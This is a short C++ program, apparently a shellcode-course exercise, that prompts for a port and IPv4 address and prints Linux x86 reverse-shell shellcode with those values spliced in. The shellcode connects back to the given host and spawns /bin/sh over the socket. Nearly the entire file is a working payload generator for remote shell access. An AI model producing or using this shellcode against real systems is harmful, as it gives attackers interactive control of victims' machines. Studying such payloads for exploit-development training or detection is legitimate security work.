/*
Author:	  evoche
License:  GPL
*/

#include <stdio.h>
#include <string.h>
#include <iostream>
#include <sstream> 
#include <netinet/in.h>
#include <arpa/inet.h>
#include <vector>
#include <iterator> 
#include <algorithm>

using namespace std;

int main()
{
	//base port number = 8888
	string portnumH = "\\x22";
	string portnumL = "\\xb8";

	//base port number = 192.168.153.131
	string IPll = "\\x83";
	string IPlh = "\\x99";
	string IPhl = "\\xA8";
	string IPhh = "\\xC0";

	cout << "Enter Port Number: ";
	int value;
	string portNo;

	//input check - port number
	while(true) 
	{
		getline(cin,portNo);
		stringstream ss1(portNo);

		//(ss >> out) checks for valid conversion to integer
		//!(ss >> portNo) checks for unconverted input and rejects it
		if(ss1 >> value && !(ss1 >> portNo))
		{
			if(value > 1024 && value < 65535)//Well-known ports < 1024
			{
				break;
			}
		}
		cin.clear(); 
		cerr << "Enter again - has to be a valid integer between 1024 and 65535: ";
	}

	std::stringstream stream;
	stream << std::hex << value;
	std::string result(stream.str());
	
	portnumH = "\\x" + result.substr(0,2);
	portnumL = "\\x" + result.substr(2,2);

	//input check - IP Address
	struct sockaddr_in sa;
	string ipAddress;
	cout << "Enter IP Address: ";
	while(true) 
	{
		getline(cin,ipAddress);
		int result = inet_pton(AF_INET, ipAddress.c_str(), &(sa.sin_addr));
		if (result) break;
		cin.clear(); 
		cerr << "Enter again - should be in IPV4 format e.g. 192.168.0.1: ";
	}

	//extract each byte of IP address
	std::replace( ipAddress.begin(), ipAddress.end(), '.', ' '); 
	istringstream iss(ipAddress);
	vector<string> tokens;
	copy(istream_iterator<string>(iss), istream_iterator<string>(), back_inserter<vector<string> >(tokens));

	//convert vector to hex
	for (size_t i=0; i < tokens.size(); i++)
	{
		int result;
		stringstream(tokens[i]) >> result;

		std::stringstream streamIP;
		streamIP << std::hex << result;

		std::string resultStr(streamIP.str());
		tokens[i] = resultStr;
	}

	IPll = "\\x" + tokens[3];
	IPlh = "\\x" + tokens[2];
	IPhl = "\\x" + tokens[1];
	IPhh = "\\x" + tokens[0];

	// Shellcode
	std::stringstream ss3;
	ss3 << "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xb0\\x66\\x43\\x56\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x66\\x43\\x43\\x68" << IPhh << IPhl << IPlh << IPll << "\\x66\\x68" << portnumH << portnumL << "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x3f\\x89\\xd3\\x89\\xf1\\xcd\\x80\\xb0\\x3f\\x89\\xd3\\x41\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
	std::string output = ss3.str();

	cout << "\nShellcode: " << output << endl;

	return 0;
}

